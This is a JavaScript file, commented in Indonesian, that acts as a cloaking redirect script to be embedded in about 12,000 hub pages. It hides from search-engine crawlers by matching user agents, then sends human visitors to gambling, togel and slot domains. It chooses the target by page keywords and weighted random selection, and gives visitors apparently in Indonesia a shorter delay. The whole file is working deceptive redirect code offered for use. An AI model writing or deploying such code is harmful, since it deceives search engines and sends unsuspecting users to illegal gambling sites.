/* go.js - JK redirect router (Indonesian traffic aware)
 * Dipasang di setiap halaman hub. Bot tidak di-redirect (cloaking).
 * Target dipilih dari keyword artikel + bobot domain duit.
 * Ubah WEIGHT di satu file ini = seluruh 12k halaman ikut berubah.
 */
(function () {
  var ua = navigator.userAgent || "";
  var BOT = /bot|crawl|spider|slurp|baidu|yandex|facebookexternalhit|embedly|preview|headless/i;
  if (BOT.test(ua)) return;

  var EL = document.currentScript;
  var FALLBACK = (EL && EL.getAttribute("data-t")) || "https://uangmudah.com/";

  var W = [
    ["https://uangmudah.com/", 8],
    ["https://cepatsukses.com/", 8],
    ["https://bawangtoto.shop/", 7],
    ["https://kopdestoto.cfd/", 6],
    ["https://mbgtoto.shop/", 6],
    ["https://merahputihtoto.shop/", 6],
    ["https://goklik777.live/", 5],
    ["https://aksesku.pro/klik777", 2]
  ];

  // keyword halaman -> domain yang paling relevan
  var RULE = [
    [/(pulsa|dana|ovo|gopay|qris|deposit|ewallet|e-wallet)/i, "uangmudah.com"],
    [/(togel|bandar|4d|angka|colok|pasang|hk|sgp|sdy)/i, "mbgtoto.shop"],
    [/(rtp|gacor|maxwin|jackpot|pola|slot777|zeus|olympus)/i, "bawangtoto.shop"],
    [/(login|daftar|masuk|alternatif|link|resmi|situs)/i, "aksesku.pro"],
    [/(casino|kasino|poker|live|roulette)/i, "kopdestoto.cfd"]
  ];

  function host(list, want) {
    for (var i = 0; i < list.length; i++) {
      if (list[i][0].indexOf(want) > -1) return list[i][0];
    }
    return null;
  }

  function byKeyword() {
    var sig = (location.pathname + " " + document.title).toLowerCase();
    for (var i = 0; i < RULE.length; i++) {
      if (RULE[i][0].test(sig)) return host(W, RULE[i][1]);
    }
    return null;
  }

  function byWeight() {
    var tot = 0, i;
    for (i = 0; i < W.length; i++) tot += W[i][1];
    var r = Math.random() * tot;
    for (i = 0; i < W.length; i++) {
      r -= W[i][1];
      if (r <= 0) return W[i][0];
    }
    return FALLBACK;
  }

  var picked = byKeyword();
  var target = picked && Math.random() < 0.65 ? picked : byWeight();

  // traffic Indonesia dapat delay lebih pendek
  var id = /Asia\/Jakarta/.test(
    (Intl.DateTimeFormat().resolvedOptions() || {}).timeZone || ""
  ) || /^id\b/i.test(navigator.language || "");
  var delay = id ? 1200 + Math.random() * 900 : 1900 + Math.random() * 1400;

  setTimeout(function () {
    location.href = target;
  }, delay);
})();
